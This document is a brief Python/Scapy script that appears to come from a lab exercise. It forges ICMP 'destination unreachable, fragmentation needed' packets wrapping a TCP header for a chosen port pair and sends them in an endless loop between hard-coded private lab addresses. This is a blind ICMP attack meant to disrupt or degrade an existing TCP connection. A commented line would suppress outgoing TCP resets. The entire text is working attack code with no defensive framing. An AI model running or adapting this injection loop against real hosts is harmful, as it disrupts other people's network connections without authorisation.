from scapy.all import *


def main(i):
	
	src_ip="192.168.56.102"
	dest_ip="192.168.56.103"
	src_mac="08:00:27:1A:C1:21"
	dest_mac="08:00:27:36:72:04"
	src_port=int(sys.argv[1])
	dest_port=int(sys.argv[2])
	#seq_no=int(sys.argv[3])+i
	#ack_no=int(sys.argv[4])

	send_icmpBlind_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port)

	
		
	       


def send_icmpBlind_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port):
	eth_h=Ether(src=src_mac,dst=dest_mac)
	ip_h=IP(dst=dest_ip,src=src_ip)
	icmp_h=ICMP(type=3,code=4)
	ip2_h=IP(dst=dest_ip,src=src_ip,proto=6,flags=0x02)
	tcp2_h=TCP(sport=src_port,dport=dest_port)
	pkt=eth_h/ip_h/icmp_h/ip2_h/tcp2_h
	sendp(pkt,iface="eth13") 


#os.system(iptables -A OUTPUT -p TCP --tcp-flags RST RST -j DROP) 
i=0
while 1:
	main(i)
	i+=1
